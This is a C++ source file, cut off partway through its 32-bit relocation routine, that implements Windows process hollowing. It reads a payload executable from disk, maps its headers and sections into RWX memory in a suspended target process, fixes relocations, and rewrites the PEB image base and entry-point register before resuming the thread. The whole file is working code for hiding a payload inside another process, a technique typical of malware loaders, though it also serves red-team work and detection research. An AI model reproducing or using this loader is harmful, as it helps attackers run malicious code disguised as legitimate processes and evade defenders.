#include <windows.h>
#include <winternl.h>

#include <cstdio>
#include <iostream>

// Define IMAGE_RELOCATION_ENTRY
typedef struct _IMAGE_RELOCATION_ENTRY {
    WORD Offset : 12;
    WORD Type : 4;
} IMAGE_RELOCATION_ENTRY, *PIMAGE_RELOCATION_ENTRY;

// Define ProcessAdddressInformation
struct ProcessAddressInformation {
    LPVOID lpProcessPEBAddress;
    LPVOID lpProcessImageBaseAddress;
};

/**
 * Usage: When Process Hollowing fails.
 * \param lpPI: Ptr to the PROCESS_INFORMATION of the target
 * \param lpFileContent: Ptr to the heap containing the payload
 */
void CloseProcessAndCleanPayload(const LPPROCESS_INFORMATION lpPI,
                                 const LPVOID lpFileContent) {
    // Free memory allocated for payload
    if (lpFileContent != nullptr) {
        HeapFree(GetProcessHeap(), 0, lpFileContent);
    }

    // Close handle to the main thread
    if (lpPI->hThread != nullptr) {
        CloseHandle(lpPI->hThread);
    }

    // Terminate process and close handle to the process
    if (lpPI->hProcess != nullptr) {
        TerminateProcess(lpPI->hProcess, -1);
        CloseHandle(lpPI->hProcess);
    }
}

/**
 * Usage: Process Hollowing succeeds. In that case, handle is no longer needed
 * \param lpPI: Ptr to the PROCESS_INFORMATION of the target
 * \param lpFileContent: Ptr to the heap containing the payload
 */
void CloseHandleAndCleanPayload(const LPPROCESS_INFORMATION lpPI,
                                const LPVOID lpFileContent) 
{
    // Free memory allocated for payload
    if (lpFileContent != nullptr) {
        HeapFree(GetProcessHeap(), 0, lpFileContent);
    }

    // Close handle to the main thread
    if (lpPI->hThread != nullptr) {
        CloseHandle(lpPI->hThread);
    }

    // Close handle to the process
    if (lpPI->hProcess != nullptr) {
        CloseHandle(lpPI->hProcess);
    }
}

LPVOID GetFileContent(const LPSTR& lpSourceImage, DWORD& dwFileSize) {
    std::cout << "\n=====GET PAYLOAD CONTENT=====\n";

    const HANDLE hFile = CreateFileA(lpSourceImage, GENERIC_READ, 0, NULL,
                                     OPEN_EXISTING, 0, nullptr);  // Read-only

    if (hFile == INVALID_HANDLE_VALUE) {
        std::cout << "\nCreate handle for the payload failed.";
        return nullptr;
    }

    std::cout << "\n[+] Payload's handle: " << hFile;

    dwFileSize = GetFileSize(hFile, NULL);
    if (dwFileSize == INVALID_FILE_SIZE) {
        std::cout << "\nRead file size failed.";
        CloseHandle(hFile);
        return nullptr;
    }

    std::cout << "\n[+] Payload's size (on disk): " << dwFileSize;

    const LPVOID lpFileContent =
        HeapAlloc(GetProcessHeap(), 0,
                  (SIZE_T)dwFileSize);  // Allocate heap for the payload
    if (lpFileContent == NULL) {
        std::cout << "\nHeap allocation failed.";
        CloseHandle(hFile);
        return nullptr;
    }

    std::cout << "\n[+] Payload's handle on heap: " << lpFileContent;

    DWORD dwReadByte;
    if (!ReadFile(hFile, lpFileContent, dwFileSize, &dwReadByte, nullptr)) {
        std::cout << "\nRead payload failed. Error code: " << GetLastError();
        HeapFree(GetProcessHeap(), 0, lpFileContent);
        CloseHandle(hFile);
        return nullptr;
    }
    else if(dwReadByte != dwFileSize)
    {
        std::cout << "\nReadFile did not read enough data.";
        HeapFree(GetProcessHeap(), 0, lpFileContent);
        CloseHandle(hFile);
        return nullptr; 
    }

    std::cout << "\n[+] Byte read: " << dwReadByte;

    CloseHandle(hFile);
    return lpFileContent;
}

bool isValidPE(const LPVOID lpPayload, const DWORD dwFileSize) {
    std::cout << "\n=====VALIDATE PE=====\n";

    if ((SIZE_T)dwFileSize < sizeof(IMAGE_DOS_HEADER)) {
        std::cout << "\nFile size is smaller than DOS Header's size.";
        return false;
    }


    const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)((uintptr_t)lpPayload);

    if (lpImageDOSHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        std::cout << "\nThe payload is not an actual PE file.";
        return false;
    }

    LONG ntAddr = lpImageDOSHeader->e_lfanew;
    // There should be enough space for NT->Signature and NT->FileHeader
    if (ntAddr < 0 || ntAddr > (LONG)dwFileSize ||
        ((LONG)dwFileSize - ntAddr) <
            sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER)) {
        std::cout << "\ne_lfanew is not valid.";
        return false;
    }

    const auto lpImageNTHeaders =
        (PIMAGE_NT_HEADERS)((uintptr_t)lpImageDOSHeader + ntAddr);

    if (lpImageNTHeaders->Signature != IMAGE_NT_SIGNATURE) {
        std::cout << "\nThe payload is not a PE image.";
        return false;
    }

    // Characteristics is a bitmask, therefore need to use &
    if ((lpImageNTHeaders->FileHeader.Characteristics &
         IMAGE_FILE_EXECUTABLE_IMAGE) == 0) {
        std::cout << "\nThis payload is not executable.";
        return false;
    }

    if (ntAddr + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) +
            lpImageNTHeaders->FileHeader.SizeOfOptionalHeader >
        dwFileSize) {
        std::cout << "\nInvalid Optional Header's size.";
        return false;
    }

    if (lpImageNTHeaders->FileHeader.SizeOfOptionalHeader < sizeof(WORD)) {
        std::cout << "\nThe size of Optional Header is not large enough for "
                     "\"Magic\" member";
        return false;
    }
    return true;
}

bool isValidOptHeader32(const LPVOID lpFileContent)
{
    const auto lpDOS = (PIMAGE_DOS_HEADER)(uintptr_t)lpFileContent;

    const auto lpNT = (PIMAGE_NT_HEADERS)((uintptr_t)lpDOS + lpDOS->e_lfanew);

    if(lpNT->FileHeader.SizeOfOptionalHeader < sizeof(IMAGE_OPTIONAL_HEADER32))
    {
        return false;
    }

    return true;
}

bool isValidOptHeader64(const LPVOID lpFileContent)
{
    const auto lpDOS = (PIMAGE_DOS_HEADER)(uintptr_t)lpFileContent;

    const auto lpNT = (PIMAGE_NT_HEADERS)((uintptr_t)lpDOS + lpDOS->e_lfanew);

    if(lpNT->FileHeader.SizeOfOptionalHeader < sizeof(IMAGE_OPTIONAL_HEADER64))
    {
        return false;
    }

    return true;
}

ProcessAddressInformation GetProcAddrInfo32(const LPPROCESS_INFORMATION lpPI) {
    std::cout << "\n=====GET TARGET PROCESS ADDRESS INFO (x86)=====\n";
    LPVOID lpProcessBaseAddress = nullptr;
    WOW64_CONTEXT ctx = {};
    ctx.ContextFlags = WOW64_CONTEXT_FULL;

    if (!Wow64GetThreadContext(lpPI->hThread, &ctx)) {
        std::cout << "\nRead context failed.";
        return ProcessAddressInformation{nullptr, nullptr};
    }

    // Ebx is where the PEB address is in x86 after suspended
    // Address to ImageBaseAddress = PEB_addr + 0x8
    PVOID ptrToImgBaseAddr = (PVOID)((uintptr_t)ctx.Ebx + 0x8);

    if (!ReadProcessMemory(lpPI->hProcess, ptrToImgBaseAddr,
                           &lpProcessBaseAddress, sizeof(DWORD), nullptr)) {
        std::cout << "\nRead process address info failed.";
        return ProcessAddressInformation{nullptr, nullptr};
    }

    std::cout << "\n[+] PEB address: " << (uintptr_t)ctx.Ebx;
    std::cout << "\n[+] Image Base Address: "
              << (uintptr_t)lpProcessBaseAddress;
    return ProcessAddressInformation{(LPVOID)(uintptr_t)ctx.Ebx,
                                     lpProcessBaseAddress};
}

ProcessAddressInformation GetProcAddrInfo64(const LPPROCESS_INFORMATION lpPI) {
    std::cout << "\n=====GET TARGET PROCESS ADDRESS INFO (x64)=====\n";
    LPVOID lpProcessBaseAddress = nullptr;
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(lpPI->hThread, &ctx)) {
        std::cout << "\nRead context failed.";
        return ProcessAddressInformation{nullptr, nullptr};
    }

    // Rdx is where the PEB address is in x64 after suspended
    // Address of ImageBaseAddress = PEB_addr + 0x10
    PVOID ptrToImgBaseAddr = (PVOID)((uintptr_t)ctx.Rdx + 0x10);

    if (!ReadProcessMemory(lpPI->hProcess, ptrToImgBaseAddr,
                           &lpProcessBaseAddress, sizeof(UINT64), nullptr)) {
        std::cout << "\nRead process address info failed.";
        return ProcessAddressInformation{nullptr, nullptr};
    }

    std::cout << "\n[+] PEB address: " << (uintptr_t)ctx.Rdx;
    std::cout << "\n[+] Image Base Address: "
              << (uintptr_t)lpProcessBaseAddress;
    return ProcessAddressInformation{(LPVOID)(uintptr_t)ctx.Rdx,
                                     lpProcessBaseAddress};
}

enum class PayloadArch
{
    x86,
    x64,
    unsupported
};

PayloadArch GetPayloadArch(const LPVOID lpFileContent) {
    std::cout << "\n=====CHECK PAYLOAD ARCH=====\n";
    const auto pImgDOSHeader = (PIMAGE_DOS_HEADER)lpFileContent;
    const auto pImgNTHeaders =
        (PIMAGE_NT_HEADERS)((uintptr_t)pImgDOSHeader + pImgDOSHeader->e_lfanew);

    if (pImgNTHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC && pImgNTHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_I386) {
        return PayloadArch::x86;
    } else if (pImgNTHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC && pImgNTHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64 ) {
        return PayloadArch::x64;
    }

    return PayloadArch::unsupported;
}

DWORD GetPayloadSubsystem32(const LPVOID lpFileContent) {
    const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpFileContent;
    const auto lpImageNTHeaders =
        (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader +
                              lpImageDOSHeader->e_lfanew);  // Why this has to
                                                            // be NT_HEADERS32?

    return lpImageNTHeaders->OptionalHeader.Subsystem;
}

DWORD GetPayloadSubsystem64(const LPVOID lpFileContent) {
    const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpFileContent;
    const auto lpImageNTHeaders =
        (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader +
                              lpImageDOSHeader->e_lfanew);

    return lpImageNTHeaders->OptionalHeader.Subsystem;
}

DWORD GetTargetSubsystem32(const HANDLE hProcess,
                           const LPVOID lpImageBaseAddress) {
    IMAGE_DOS_HEADER ImgDOSHeader = {};

    if (!ReadProcessMemory(hProcess, lpImageBaseAddress, (LPVOID)&ImgDOSHeader,
                           sizeof(IMAGE_DOS_HEADER), nullptr)) {
        std::cout << "\nCannot read DOS Header of the target.";
        return (DWORD)-1;
    }

    IMAGE_NT_HEADERS32 ImgNTHeaders = {};
    if (!ReadProcessMemory(
            hProcess,
            (LPVOID)((uintptr_t)lpImageBaseAddress + ImgDOSHeader.e_lfanew),
            (LPVOID)&ImgNTHeaders, sizeof(IMAGE_NT_HEADERS32), nullptr)) {
        std::cout << "\nCannot read NT Headers of the target.";
        return (DWORD)-1;
    }

    return ImgNTHeaders.OptionalHeader.Subsystem;
}

DWORD GetTargetSubsystem64(const HANDLE hProcess,
                           const LPVOID lpImageBaseAddress) {
    IMAGE_DOS_HEADER ImgDOSHeader = {};

    if (!ReadProcessMemory(hProcess, lpImageBaseAddress, (LPVOID)&ImgDOSHeader,
                           sizeof(IMAGE_DOS_HEADER), nullptr)) {
        std::cout << "\nCannot read DOS Header of the target.";
        return (DWORD)-1;
    }

    IMAGE_NT_HEADERS64 ImgNTHeaders = {};
    if (!ReadProcessMemory(
            hProcess,
            (LPVOID)((uintptr_t)lpImageBaseAddress + ImgDOSHeader.e_lfanew),
            (LPVOID)&ImgNTHeaders, sizeof(IMAGE_NT_HEADERS64), nullptr)) {
        std::cout << "\nCannot read NT Headers of the target.";
        return (DWORD)-1;
    }

    return ImgNTHeaders.OptionalHeader.Subsystem;
}

bool HasReloc32(const LPVOID lpFileContent) {
    const auto lpDOS = (PIMAGE_DOS_HEADER)lpFileContent;
    const auto lpNT = (PIMAGE_NT_HEADERS32)((uintptr_t)lpDOS + lpDOS->e_lfanew);

    if(lpNT->FileHeader.SizeOfOptionalHeader < sizeof(IMAGE_OPTIONAL_HEADER32))
    {
        std::cout << "\nSizeOfOptionalHeader is insufficient.";
        return false;
    }

    if (lpNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
            .VirtualAddress != 0)
        return true;

    return false;
}

bool HasReloc64(const LPVOID lpFileContent) {
    const auto lpDOS = (PIMAGE_DOS_HEADER)lpFileContent;
    const auto lpNT = (PIMAGE_NT_HEADERS64)((uintptr_t)lpDOS + lpDOS->e_lfanew);

    if(lpNT->FileHeader.SizeOfOptionalHeader < sizeof(IMAGE_OPTIONAL_HEADER64))
    {
        std::cout << "\nSizeOfOptionalHeader is insufficient.";
        return false;
    }

    if (lpNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
            .VirtualAddress != 0)
        return true;

    return false;
}

bool RunPE32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpFileContent, const DWORD dwFileSize) {
    // Get headers
    const auto lpDOS = (PIMAGE_DOS_HEADER)lpFileContent;
    const auto lpNT = (PIMAGE_NT_HEADERS32)((uintptr_t)lpDOS + lpDOS->e_lfanew);

    // Alloc
    LPVOID lpAllocAddress = VirtualAllocEx(
        lpPI->hProcess, (LPVOID)((uintptr_t)lpNT->OptionalHeader.ImageBase),
        (SIZE_T)lpNT->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE);

    if(lpAllocAddress == NULL)
    {
        std::cout << "\nVirtualAllocEx failed. Error: " << GetLastError();
        return false;
    }

    // Write headers
    if (!WriteProcessMemory(lpPI->hProcess, lpAllocAddress, lpFileContent,
                            (SIZE_T)lpNT->OptionalHeader.SizeOfHeaders, NULL)) {
        std::cout << "\nWrite headers on allocated space failed. Error code: "
                  << GetLastError();
        return false;
    }

    // Write sections
    for (int i = 0; i < lpNT->FileHeader.NumberOfSections; ++i) {
        const auto lpImageSectionHeader =
            (PIMAGE_SECTION_HEADER)((uintptr_t)lpNT + 4 +
                                    sizeof(IMAGE_FILE_HEADER) +
                                    lpNT->FileHeader.SizeOfOptionalHeader +
                                    (i * sizeof(IMAGE_SECTION_HEADER)));

        std::cout << "\n[+] Size of section " << i + 1 << ": "
                  << (SIZE_T)lpImageSectionHeader->SizeOfRawData;

        if ((lpImageSectionHeader->VirtualAddress +
             lpImageSectionHeader->SizeOfRawData) >
            (SIZE_T)lpNT->OptionalHeader.SizeOfImage) {
            std::cout
                << "\nThe section's size is larger than the allocated space.";
            return false;
        }
        
        if((lpImageSectionHeader->PointerToRawData + lpImageSectionHeader->SizeOfRawData) > dwFileSize)
        {
            std::cout << "\nSection exceeds file size limit.";
            return false;
        }

        if (!WriteProcessMemory(
                lpPI->hProcess,
                (LPVOID)((uintptr_t)lpAllocAddress +
                         lpImageSectionHeader->VirtualAddress),
                (LPVOID)((uintptr_t)lpFileContent +
                         lpImageSectionHeader->PointerToRawData),
                (SIZE_T)lpImageSectionHeader->SizeOfRawData, NULL)) {
            std::cout << "\nSection " << i + 1
                      << " was not written successfully. Error code: "
                      << GetLastError();
            return false;
        }
    }

    // Update the ImageBaseAddress to lpAllocAddress
    // Ebx: Address of PEB (virtual address, not RVA)
    // Ebx + 0x8: Address of the ImageBaseAddress
    WOW64_CONTEXT ctx = {};
    ctx.ContextFlags = WOW64_CONTEXT_FULL;

    if (!Wow64GetThreadContext(lpPI->hThread, &ctx)) {
        std::cout << "\nRead context failed. Error code: " << GetLastError();
        return false;
    }

    if (!WriteProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)ctx.Ebx + 0x8),
                            (LPVOID)&lpAllocAddress, sizeof(DWORD), NULL)) {
        std::cout << "\nUpdate ImageBaseAddress failed. Error code: "
                  << GetLastError();
        return false;
    }

    // Update Entry Point
    // During suspended time, in x86, Eax is the Entry Point register of the
    // process
    ctx.Eax = (DWORD)((uintptr_t)lpAllocAddress +
                      lpNT->OptionalHeader.AddressOfEntryPoint);

    if (!Wow64SetThreadContext(lpPI->hThread, &ctx)) {
        std::cout << "\nUpdate context failed. Error code: " << GetLastError();
        return false;
    }

    // Flush instruction cache of the CPU to ensure instruction-cache coherence
    if (!FlushInstructionCache(lpPI->hProcess, (LPVOID)lpAllocAddress,
                               lpNT->OptionalHeader.SizeOfImage)) {
        std::cout << "\nFlush instruction cache failed. Error code: "
                  << GetLastError();
        return false;
    }

    DWORD prevSuspendedCount = ResumeThread(lpPI->hThread);
    if (prevSuspendedCount == static_cast<DWORD>(-1)) {
        std::cout << "\nResumeThread failed. Error: " << GetLastError();
        return false;
    } else if (prevSuspendedCount > 1) {
        std::cout << "\nResumeThread succeeded, but the thread has not resumed yet. Error: "
                  << GetLastError();
        return false;
    }
    return true;
}

bool RunPE64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpFileContent, const DWORD dwFileSize) {
    // Get headers
    const auto lpDOS = (PIMAGE_DOS_HEADER)lpFileContent;
    const auto lpNT = (PIMAGE_NT_HEADERS64)((uintptr_t)lpDOS + lpDOS->e_lfanew);

    std::cout << "\n[+] Size of image: "
              << (SIZE_T)lpNT->OptionalHeader.SizeOfImage;

    // Alloc
    LPVOID lpAllocAddress = VirtualAllocEx(
        lpPI->hProcess, (LPVOID)((uintptr_t)lpNT->OptionalHeader.ImageBase),
        (SIZE_T)lpNT->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE);

    if (lpAllocAddress == NULL) {
        std::cout << "\nVirtualAllocEx failed. Error code: " << GetLastError();
        return false;
    }

    std::cout << "\n[+] Alloc address: " << (uintptr_t)lpAllocAddress;
    std::cout << "\n[+] Size of headers: "
              << (SIZE_T)lpNT->OptionalHeader.SizeOfHeaders;

    // Write headers
    if (!WriteProcessMemory(lpPI->hProcess, lpAllocAddress, lpFileContent,
                            (SIZE_T)lpNT->OptionalHeader.SizeOfHeaders, NULL)) {
        std::cout << "\nWrite headers on allocated space failed.";
        return false;
    }

    // Write sections
    for (int i = 0; i < lpNT->FileHeader.NumberOfSections; ++i) {
        const auto lpImageSectionHeader =
            (PIMAGE_SECTION_HEADER)((uintptr_t)lpNT + 4 +
                                    sizeof(IMAGE_FILE_HEADER) +
                                    lpNT->FileHeader.SizeOfOptionalHeader +
                                    (i * sizeof(IMAGE_SECTION_HEADER)));
        std::cout << "\n[+] Size of section " << i + 1 << ": "
                  << (SIZE_T)lpImageSectionHeader->SizeOfRawData;

        if ((lpImageSectionHeader->VirtualAddress +
             lpImageSectionHeader->SizeOfRawData) >
            (SIZE_T)lpNT->OptionalHeader.SizeOfImage) {
            std::cout
                << "\nThe section's size is larger than the allocated space.";
            return false;
        }

        if((lpImageSectionHeader->PointerToRawData + lpImageSectionHeader->SizeOfRawData) > dwFileSize)
        {
            std::cout << "\nSection exceeds file size limit.";
            return false;
        }

        if (!WriteProcessMemory(
                lpPI->hProcess,
                (LPVOID)((uintptr_t)lpAllocAddress +
                         lpImageSectionHeader->VirtualAddress),
                (LPVOID)((uintptr_t)lpFileContent +
                         lpImageSectionHeader->PointerToRawData),
                (SIZE_T)lpImageSectionHeader->SizeOfRawData, NULL)) {
            std::cout << "\nSection " << i + 1
                      << " was not written successfully. Error code: "
                      << GetLastError();
            return false;
        }
    }

    // Update the ImageBaseAddress to lpAllocAddress
    // Rdx: Address of PEB (virtual address, not RVA)
    // Rdx + 0x10: Address of the ImageBaseAddress
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(lpPI->hThread, &ctx)) {
        std::cout << "\nRead context failed. Error code: " << GetLastError();
        return false;
    }

    if (!WriteProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)ctx.Rdx + 0x10),
                            (LPVOID)&lpAllocAddress, sizeof(DWORD64), NULL)) {
        std::cout << "\nUpdate ImageBaseAddress failed. Error code: "
                  << GetLastError();
        return false;
    }

    // Update Entry Point - Rcx
    // During suspended time, in x64, Rcx is the Entry Point register of the
    // process
    ctx.Rcx =
        (DWORD64)lpAllocAddress + lpNT->OptionalHeader.AddressOfEntryPoint;

    if (!SetThreadContext(lpPI->hThread, &ctx)) {
        std::cout << "\nUpdate context failed. Error code: " << GetLastError();
        return false;
    }

    // Flush instruction cache of the CPU to ensure instruction-cache coherence
    if (!FlushInstructionCache(lpPI->hProcess, (LPVOID)lpAllocAddress,
                               lpNT->OptionalHeader.SizeOfImage)) {
        std::cout << "\nFlush instruction cache failed. Error code: "
                  << GetLastError();
        return false;
    }

    DWORD prevSuspendedCount = ResumeThread(lpPI->hThread);
    if (prevSuspendedCount == static_cast<DWORD>(-1)) {
        std::cout << "\nResumeThread failed. Error: " << GetLastError();
        return false;
    } else if (prevSuspendedCount > 1) {
        std::cout << "\nResumeThread succeeded, but the thread has not resumed yet. Error: "
                  << GetLastError();
        return false;
    }

    return true;
}

IMAGE_DATA_DIRECTORY GetReloc32(const LPVOID lpFileContent) {
    const auto lpDOS = (PIMAGE_DOS_HEADER)lpFileContent;
    const auto lpNT = (PIMAGE_NT_HEADERS32)((uintptr_t)lpDOS + lpDOS->e_lfanew);

    if (lpNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
            .VirtualAddress != 0)
        return lpNT->OptionalHeader
            .DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    return {0, 0};
}

IMAGE_DATA_DIRECTORY GetReloc64(const LPVOID lpFileContent) {
    const auto lpDOS = (PIMAGE_DOS_HEADER)lpFileContent;
    const auto lpNT = (PIMAGE_NT_HEADERS64)((uintptr_t)lpDOS + lpDOS->e_lfanew);

    if (lpNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
            .VirtualAddress != 0)
        return lpNT->OptionalHeader
            .DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    return {0, 0};
}

bool RunPEReloc32(const LPPROCESS_INFORMATION lpPI,
                  const LPVOID lpFileContent, const DWORD dwFileSize) {
    // Get headers
    const auto lpDOS = (PIMAGE_DOS_HEADER)lpFileContent;
    const auto lpNT = (PIMAGE_NT_HEADERS32)((uintptr_t)lpDOS + lpDOS->e_lfanew);

    std::cout << "\n[+] Size of image: "
              << (SIZE_T)lpNT->OptionalHeader.SizeOfImage;

    bool bNeedReloc = false;
    LPVOID lpAllocAddress;

    // Try to alloc in the ImageBase
    lpAllocAddress = VirtualAllocEx(
        lpPI->hProcess, (LPVOID)((uintptr_t)lpNT->OptionalHeader.ImageBase),
        (SIZE_T)lpNT->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE);

    if (lpAllocAddress == NULL) bNeedReloc = true;

    // If previous allocation fails, lpAddress = NULL
    if (bNeedReloc) {
        lpAllocAddress = VirtualAllocEx(
            lpPI->hProcess, NULL, (SIZE_T)lpNT->OptionalHeader.SizeOfImage,
            MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        if (lpAllocAddress == NULL) {
            std::cout << "\nVirtualAllocEx failed. Error code: "
                      << GetLastError();
            return false;
        }
    }

    std::cout << "\n[+] Alloc address: " << (uintptr_t)lpAllocAddress;

    // Delta
    const DWORD64 DeltaImageBase =
        (DWORD64)lpAllocAddress - lpNT->OptionalHeader.ImageBase;

    std::cout << "\n[+] Delta: " << DeltaImageBase;

    // Set new ImageBase
    if (bNeedReloc) lpNT->OptionalHeader.ImageBase = (DWORD64)lpAllocAddress;

    std::cout << "\n[+] Size of headers: "
              << (SIZE_T)lpNT->OptionalHeader.SizeOfHeaders;

    // Write headers
    if (!WriteProcessMemory(lpPI->hProcess, lpAllocAddress, lpFileContent,
                            (SIZE_T)lpNT->OptionalHeader.SizeOfHeaders, NULL)) {
        std::cout << "\nWrite headers on allocated space failed. Error code: "
                  << GetLastError();
        return false;
    }

    // Setup variables for .reloc
    IMAGE_DATA_DIRECTORY ImgDataReloc;

    if (bNeedReloc)
        ImgDataReloc = GetReloc32(lpFileContent);  // The reloc table

    if (bNeedReloc && (ImgDataReloc.VirtualAddress == 0 ||
        ImgDataReloc.Size == 0)) {
        std::cout << "\nUnable to retrieve reloc table. Error code: "
                  << GetLastError();
        return false;
    }

    PIMAGE_SECTION_HEADER lpRelocSection =
        nullptr;  // The address of the section containing reloc

    // Write sections
    for (int i = 0; i < lpNT->FileHeader.NumberOfSections; ++i) {
        const auto lpImageSectionHeader =
            (PIMAGE_SECTION_HEADER)((uintptr_t)lpNT + 4 +
                                    sizeof(IMAGE_FILE_HEADER) +
                                    lpNT->FileHeader.SizeOfOptionalHeader +
                                    (i * sizeof(IMAGE_SECTION_HEADER)));

        // Check if the size of the section is larger than the allocated space
        // lpImageSectionHeader->VirtualAddress is RVA, not VA
        if ((lpImageSectionHeader->VirtualAddress +
             lpImageSectionHeader->SizeOfRawData) >
            (SIZE_T)lpNT->OptionalHeader.SizeOfImage) {
            std::cout
                << "\nThe section's size is larger than the allocated space.";
            return false;
        }

        if((lpImageSectionHeader->PointerToRawData + lpImageSectionHeader->SizeOfRawData) > dwFileSize)
        {
            std::cout << "\nSection exceeds file size limit.";
            return false;
        }

        if (bNeedReloc &&
            ImgDataReloc.VirtualAddress >=
                (uintptr_t)lpImageSectionHeader->VirtualAddress &&
            ImgDataReloc.VirtualAddress <
                (lpImageSectionHeader->VirtualAddress +
                 lpImageSectionHeader->Misc.VirtualSize))
            lpRelocSection = lpImageSectionHeader;

        if (!WriteProcessMemory(
                lpPI->hProcess,
                (LPVOID)((uintptr_t)lpAllocAddress +
                         lpImageSectionHeader->VirtualAddress),
                (LPVOID)((uintptr_t)lpFileContent +
                         lpImageSectionHeader->PointerToRawData),
                (SIZE_T)lpImageSectionHeader->SizeOfRawData, NULL)) {
            std::cout << "\nSection " << i + 1
                      << " was not written successfully. Error code: "
                      << GetLastError();
            return false;
        }
    }

    if (bNeedReloc && lpRelocSection == nullptr) {
        std::cout << "\nCannot find relocation section.";
        return false;
    }

    // Fixing addresses
    if (bNeedReloc) {
        std::cout << "\n=====FIXING ADDRESSES=====\n";
        int iNumOfBlocks = 0;
        DWORD dwRemainingByte = ImgDataReloc.Size;
        DWORD dwRelocOffset = 0;
        while (dwRemainingByte > 0) {
            // IMAGE_BASE_RELOCATION has a member called VirtualAddress
            // This indicates the start of a page (4KB) that has addresses to be
            // fixed, and these addresses are in this block
            if(dwRemainingByte < 8)
            {
                std::cout << "\nCannot read the next block. The remaining byte is smaller than 8 bytes.";
                return false;
            }
            std::cout << "\n[+] Block " << ++iNumOfBlocks;
            const auto RelocBlock =
                (PIMAGE_BASE_RELOCATION)(DWORD64)((uintptr_t)lpFileContent +
                                                  dwRelocOffset +
                                                  lpRelocSection
                                                      ->PointerToRawData +
                                                  (ImgDataReloc.VirtualAddress -
                                                   lpRelocSection
                                                       ->VirtualAddress));  // Get the reloc block

            dwRelocOffset += sizeof(IMAGE_BASE_RELOCATION);

            if(RelocBlock->SizeOfBlock < 0x8)
            {
                std::cout << "\nNo size for the entries.";
                return false;
            }
            else if(RelocBlock->SizeOfBlock > dwRemainingByte)
            {
                std::cout << "\nSizeOfBlock is larger than remaining bytes.";
                return false;
            }

            dwRemainingByte -= sizeof(IMAGE_BASE_RELOCATION);

            DWORD dwNumOfEntries = (DWORD)(RelocBlock->SizeOfBlock - 0x8) /
                                   0x2;  // 0x2 is the size of IMAGE_RELOC_ENTRY

            if(dwNumOfEntries * 0x2 != (RelocBlock->SizeOfBlock - 0x8))
            {
                std::cout << "\nThe size for entries is not valid.";
                return false;
            }
            for (DWORD i = 0; i < dwNumOfEntries; ++i) {
                const auto RelocEntry =
                    (PIMAGE_RELOCATION_ENTRY)(DWORD64)((uintptr_t)
                                                           lpFileContent +
                                                       lpRelocSection
                                                           ->PointerToRawData +
                                                       (ImgDataReloc
                                                            .VirtualAddress -
                                                        lpRelocSection
                                                            ->VirtualAddress) +
                                                       dwRelocOffset);

                dwRemainingByte -= 0x2;
                dwRelocOffset += 0x2;

                // Padding entry, no need to intervene
                if (RelocEntry->Type == IMAGE_REL_BASED_ABSOLUTE) continue;

                DWORD dwOffset = DWORD(RelocBlock->VirtualAddress + RelocEntry->Offset);
                if(dwOffset > lpNT->OptionalHeader.SizeOfImage)
                {
                    std::cout << "\nThe location to be value-fixed exceeds the size of image.";
                    return false;
                }

                const auto ptrToTheAddressToFix = (uintptr_t)lpAllocAddress + dwOffset;

                DWORD dwFixedAddress;

                if (!ReadProcessMemory(
                        lpPI->hProcess, (LPVOID)ptrToTheAddressToFix,
                        (LPVOID)&dwFixedAddress, sizeof(DWORD), NULL)) {
                    std::cout
                        << "\nCannot read the address to be fixed. Error code: "
                        << GetLastError();
                    return false;
                }

                if (RelocEntry->Type == IMAGE_REL_BASED_HIGHLOW) {
                    dwFixedAddress += static_cast<DWORD>(DeltaImageBase);
                }

                else {
                    std::cout << "\nRelocation type not supported.";
                    return false;
                }

                if (!WriteProcessMemory(
                        lpPI->hProcess, (LPVOID)ptrToTheAddressToFix,
                        (LPVOID)&dwFixedAddress, sizeof(DWORD), NULL)) {
                    std::cout << "\nCannot patch new address. Error code: "
                              << GetLastError();
                    return false;
                }
            }
        }
    }

    // Set new entry point (Eax) and write the new image base (Ebx + 0x8)
    WOW64_CONTEXT ctx = {};
    ctx.ContextFlags = WOW64_CONTEXT_FULL;

    if (!Wow64GetThreadContext(lpPI->hThread, &ctx)) {
        std::cout << "\nCannot retrieve context. Error code: "
                  << GetLastError();
        return false;
    }

    if (!WriteProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)ctx.Ebx + 0x8),
                            (LPVOID)&lpAllocAddress, sizeof(DWORD), NULL)) {
        std::cout << "\nCannot set new image base in PEB. Error code: "
                  << GetLastError();
        return false;
    }

    ctx.Eax = (DWORD)((uintptr_t)lpAllocAddress +
                      lpNT->OptionalHeader.AddressOfEntryPoint);

    if (!Wow64SetThreadContext(lpPI->hThread, &ctx)) {
        std::cout << "\nCannot set new thread context. Error code: "
                  << GetLastError();
        return false;
    }

